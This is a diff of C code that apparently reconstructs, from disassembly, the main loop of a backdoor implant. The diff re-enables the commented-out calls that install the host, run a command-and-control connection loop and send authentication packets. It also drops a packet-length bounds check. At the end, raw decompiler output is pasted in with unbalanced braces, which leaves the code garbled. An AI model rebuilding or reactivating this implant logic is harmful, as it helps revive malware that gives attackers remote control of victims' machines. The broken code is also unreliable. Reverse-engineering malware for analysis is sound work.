@@ -35,9 +35,9 @@ int main (int argc, char **argv, char **envp) {
 
 	InitAESTables();
 
-	// InitTransfersList();
+	InitTransfersList();
 
-	// ReadSettings();
+	ReadSettings();
 
 	InstallHost();
 
@@ -49,28 +49,20 @@ int main (int argc, char **argv, char **envp) {
 
 			TerminateRunningOperations();
 
-			// EstablishConnectionLoop();
+			EstablishConnectionLoop();
 
 			// If the returned value is not 0 or 4294967295 then we can go back
 			// to the read packet part
-			// SendAuthenticationPacket();
+			SendAuthenticationPacket();
 
 		} else {
 			// If a packet is successfully read
 			
 			if (IsDataSizeAllowed(fd, buf) !=  0) {
 
-				// From the disassembly I actually don't know how many bytes are
-				// read, but I can safely assume at most `sizeof(buf)' bytes are
-				// read
 				ret = ReadPacket(fd, buf, sizeof(buf));
-
-				if (ret > 0) {
-					if (ret < 3037) {
-						var_c26 = 0;
-					}
-
-					// ret = IsCommandAllowed(fd, var_c26, ret, ret);
+					
+				IsCommandAllowed(fd, var_c26, ret, ret);
 
 					if (ret != 0) {
 						// Here we go down the rabbit hole
@@ -88,5 +80,33 @@ int main (int argc, char **argv, char **envp) {
 
 
 
-
+v6 = ReadPacket(v5, &v10, v4);
+        v7 = v6;
+        if ( v6 > 0 )
+        {
+          if ( v6 <= 3073 )
+            *(&v10 + v6) = 0;
+          v8 = v10;
+          v9 = fd;
+          if ( IsCommandAllowed(fd, v10) )
+          {
+            ProcessData(&v10, v9, v8, &filename, v7 - 1);
+          }
+          else
+          {
+            cpSleep(0x2710u);
+            CloseSocket(&fd);
+          }
+        }
+      }
+    }
+    CloseSocket(&fd);
+    TerminateRunningOperations();
+    do
+    {
+      fd = EstablishConnectionLoop();
+      if ( !SendAuthenticationPacket(&fd) )
+        cpSleep(0x2710u);
+    }
+    while ( fd == -1 )
 
